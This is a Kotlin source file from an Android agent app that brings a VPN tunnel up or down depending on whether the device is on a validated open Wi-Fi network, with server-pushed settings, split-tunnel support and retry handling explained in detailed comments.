package com.android.systemservices

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * Toggles {@link SentinelVpnService} so that ALL traffic is tunnelled through the agent's REALITY
 * transport exactly while the device is ASSOCIATED with an OPEN (unencrypted) WiFi network — and
 * only when the feature is enabled, an egress UUID is provisioned, and that WiFi has VALIDATED.
 *
 * Network selection deliberately reads the ASSOCIATED WiFi (`cm.allNetworks` filtered on
 * TRANSPORT_WIFI), never `cm.activeNetwork`. On guest/captive networks Android keeps CELLULAR as
 * the OS default route — and the agent itself can pin cellular via its own `requestNetwork` hold
 * (SocketManager.requestCellular) — so the default route is routinely NOT the WiFi this feature
 * exists to protect. Keying off the default route made both the trigger and the "Open WiFi"
 * indicator silently read false while the phone sat on an open AP.
 *
 * Default OFF, server-pushed via the `set_vpn` command (Prefs.vpnOnOpenWifiEnabled / vpnEgressUuid),
 * mirroring {@link WifiAutoJoinHelper}. Cellular and secured/OWE WiFi ⇒ tunnel off (traffic direct).
 */
object OpenWifiVpnController {
    private const val TAG = "OpenWifiVpn"
    private const val RETRY_DELAY_MS = 5_000L   // re-attempt a failed (e.g. boot-time) tunnel bring-up

    @Volatile private var registered = false
    @Volatile private var tunnelUp = false
    @Volatile private var tunnelSplit = false   // scope of the tunnel we last asked the service for
    @Volatile private var tunnelV6 = false      // whether that (full) tunnel was asked to carry IPv6
    @Volatile private var lastOpenWifi = false
    @Volatile private var appCtx: Context? = null

    /** True while a SPLIT (tailnet-only) tunnel is up — surfaced in device_status for the WebUI badge. */
    val isSplitTunnel: Boolean get() = tunnelUp && tunnelSplit
    private val retryHandler = Handler(Looper.getMainLooper())
    @Volatile private var retryPending = false

    /** Set by MonitoringService → pushes an immediate device_status so the WebUI VPN / open-WiFi
     *  badges update the moment the tunnel comes up/down or the device joins/leaves an open AP. */
    @Volatile var onStateChanged: (() -> Unit)? = null
    fun notifyStatusChanged() { try { onStateChanged?.invoke() } catch (_: Throwable) {} }

    private val callback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) = safeReeval()
        override fun onLost(network: Network) = safeReeval()
        override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) = safeReeval()
    }

    /**
     * Second watcher, keyed on the Wi-Fi network itself rather than on the OS *default route*.
     *
     * `registerDefaultNetworkCallback` only fires when the DEFAULT network changes — but on exactly
     * the networks this feature exists for (guest / captive-portal APs) Android keeps CELLULAR as the
     * default while the agent rides Wi-Fi over an explicit bind (see SocketManager.registerWifiCallback).
     * When the portal then clears and that Wi-Fi becomes VALIDATED, the default may not change at all
     * (the agent's own cellular `requestNetwork` can keep holding it), so the default callback never
     * fires and `reevaluate()` is never re-run → Auto-VPN stays down while the Wi-Fi sits validated.
     * Watching TRANSPORT_WIFI directly makes that transition re-trigger the evaluation.
     */
    private val wifiCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) = safeReeval()
        override fun onLost(network: Network) = safeReeval()
        override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) = safeReeval()
    }

    private fun safeReeval() { appCtx?.let { try { reevaluate(it) } catch (_: Throwable) {} } }

    /** Register the watchers. Idempotent — a cheap no-op while the feature is OFF. */
    fun start(context: Context) {
        if (registered) return
        val ctx = context.applicationContext
        appCtx = ctx
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
        try {
            cm.registerDefaultNetworkCallback(callback)
            // No NET_CAPABILITY_INTERNET/VALIDATED filter: we must see the Wi-Fi BECOME validated,
            // so the request has to match an unvalidated/captive Wi-Fi too.
            val wifiReq = NetworkRequest.Builder()
                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                .build()
            try { cm.registerNetworkCallback(wifiReq, wifiCallback) }
            catch (t: Throwable) { Log.e(TAG, "wifi callback register failed: ${t.message}") }
            registered = true
            reevaluate(ctx)
        } catch (t: Throwable) { Log.e(TAG, "register failed: ${t.message}") }
    }

    /** Recompute the desired state and start/stop the VPN accordingly. Idempotent. */
    @Synchronized
    fun reevaluate(context: Context) {
        val ctx = context.applicationContext
        val prefs = Prefs(ctx)
        val onOpen = isOnOpenWifi(ctx)
        val egress = prefs.vpnEgressUuid.isNotBlank()
        // Full tunnel (ALL traffic via the node): manual "route all traffic now" (force) on every
        // network, or auto only while the active network is an OPEN WiFi that has already
        // VALIDATED. Starting the tunnel on a captive inflight portal blackholes the login.
        val fullDesired  = egress && (prefs.vpnForceEnabled || (prefs.vpnOnOpenWifiEnabled && onOpen && isValidatedWifi(ctx)))
        // Split tunnel (ONLY the assigned tailnet subnets; internet stays direct). Needs subnets to be
        // assigned. Full tunnel is a superset (it already steers those subnets to the relay) → it wins.
        val splitDesired = egress && prefs.vpnTailnetOnly && !fullDesired &&
                           TransportManager.tailnetSubnets(ctx).isNotEmpty()
        val desired = fullDesired || splitDesired
        val split   = splitDesired   // when desired and not full, the scope is split
        val v6      = fullDesired && prefs.vpnV6Enabled   // IPv6 is only meaningful for the full tunnel

        if (desired && (!tunnelUp || tunnelSplit != split || tunnelV6 != v6)) {
            Log.i(TAG, "VPN desired (${if (split) "split/tailnet-only" else if (v6) "full+v6" else "full"} force=${prefs.vpnForceEnabled}) → start VPN")
            tunnelUp = true; tunnelSplit = split; tunnelV6 = v6
            SentinelVpnService.start(ctx, split, v6)
        } else if (!desired && tunnelUp) {
            Log.i(TAG, "VPN not desired → stop VPN")
            tunnelUp = false
            SentinelVpnService.stop(ctx)
        }
        // Push a status refresh when the open-WiFi state flips (VPN connect/disconnect is nudged
        // separately by SentinelVpnService once the TUN is actually up/down).
        if (onOpen != lastOpenWifi) { lastOpenWifi = onOpen; notifyStatusChanged() }
    }

    /** Called by the service when the OS revoked the tunnel — re-sync and let reevaluate restart it. */
    fun onTunnelStopped() { tunnelUp = false; safeReeval() }

    /** The service could not bring the tunnel up — most often right after BOOT, before the REALITY
     *  control transport has connected and a node is available (ensureRunningForVpn returns -1), or
     *  before always-on consent is armed. reevaluate() set tunnelUp=true optimistically, which would
     *  otherwise wedge the VPN OFF until a manual toggle. Clear the flag and retry shortly so it
     *  establishes on its own once the transport is ready. retryPending collapses repeated failures
     *  into a single pending retry (a steady ~5s cadence, not a tight loop). */
    fun onTunnelStartFailed() {
        tunnelUp = false
        if (retryPending) return
        retryPending = true
        retryHandler.postDelayed({ retryPending = false; safeReeval() }, RETRY_DELAY_MS)
    }

    /** True when the associated Wi-Fi is internet-VALIDATED (portal already cleared).
     *
     *  Deliberately NOT `cm.activeNetwork`: the agent keeps an explicit cellular `requestNetwork`
     *  hold in places (SocketManager.requestCellular), which pins CELLULAR as the OS default route
     *  even while a validated Wi-Fi is associated and the agent is bound to it. Reading the default
     *  route made this return false in exactly that state, so Auto-VPN never came up even though the
     *  Wi-Fi was open AND validated. The VALIDATED requirement itself is unchanged — it is what
     *  stops the tunnel from black-holing an un-cleared captive portal. */
    private fun isValidatedWifi(ctx: Context): Boolean {
        val net = associatedWifi(ctx) ?: return false
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
        val caps = cm.getNetworkCapabilities(net) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
    }

    /** The Wi-Fi network the device is currently associated with, or null when Wi-Fi is down.
     *  Scans `cm.allNetworks` rather than trusting `cm.activeNetwork` — see [isValidatedWifi].
     *  Explicitly skips the VPN's own network (TRANSPORT_VPN) so we never read the security type
     *  off our own TUN while the tunnel is up. */
    private fun associatedWifi(ctx: Context): Network? {
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return null
        return try {
            cm.allNetworks?.firstOrNull {
                try {
                    val c = cm.getNetworkCapabilities(it) ?: return@firstOrNull false
                    c.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) &&
                    !c.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
                } catch (_: Throwable) { false }
            }
        } catch (_: Throwable) { null }
    }

    /** True when the device is ASSOCIATED with an OPEN (unencrypted) WiFi network — the auto-VPN
     *  trigger condition and the "Open WiFi" status indicator. Public so MonitoringService can report it.
     *
     *  Evaluated against the ASSOCIATED WiFi, not `cm.activeNetwork` (see [isValidatedWifi]). */
    fun isOnOpenWifi(ctx: Context): Boolean {
        val net = associatedWifi(ctx) ?: return false
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
        val caps = cm.getNetworkCapabilities(net) ?: return false
        val wifiInfo = caps.transportInfo as? WifiInfo
        // API 31+: the WifiInfo carried by the network capabilities reports the security type directly.
        if (Build.VERSION.SDK_INT >= 31 && wifiInfo != null) {
            // SECURITY_TYPE_UNKNOWN (-1) is NOT "secured": AOSP only records the type from the
            // connection event's keyMgmtMask, and an OPEN network has none (supplicant mask 0 → null
            // → setCurrentSecurityType() never runs), so it is commonly left UNKNOWN on exactly the
            // networks this feature targets. Returning false there would disable Auto-VPN outright AND
            // skip the scan fallback — so UNKNOWN means "ask the scan cache" instead.
            if (wifiInfo.currentSecurityType != WifiInfo.SECURITY_TYPE_UNKNOWN) {
                return wifiInfo.currentSecurityType == WifiInfo.SECURITY_TYPE_OPEN
            }
        }
        return scanSaysOpen(ctx, wifiInfo?.bssid)
    }

    /** Scan-cache fallback: match the connected BSSID against the current scan results.
     *  [hintBssid] (the live WifiInfo's BSSID) is preferred over the deprecated
     *  `WifiManager.connectionInfo`, which can be redacted to 02:00:00:00:00:00. */
    @Suppress("DEPRECATION", "MissingPermission")
    private fun scanSaysOpen(ctx: Context, hintBssid: String?): Boolean = try {
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val bssid = hintBssid?.takeIf { it.isNotBlank() && it != "02:00:00:00:00:00" }
            ?: wm.connectionInfo?.bssid?.takeIf { it.isNotBlank() && it != "02:00:00:00:00:00" }
        if (bssid == null) false
        else wm.scanResults?.firstOrNull { it.BSSID.equals(bssid, true) }
             ?.let { WifiAutoJoinHelper.isOpen(it.capabilities) } ?: false
    } catch (t: Throwable) { Log.d(TAG, "scanSaysOpen: ${t.message}"); false }
}
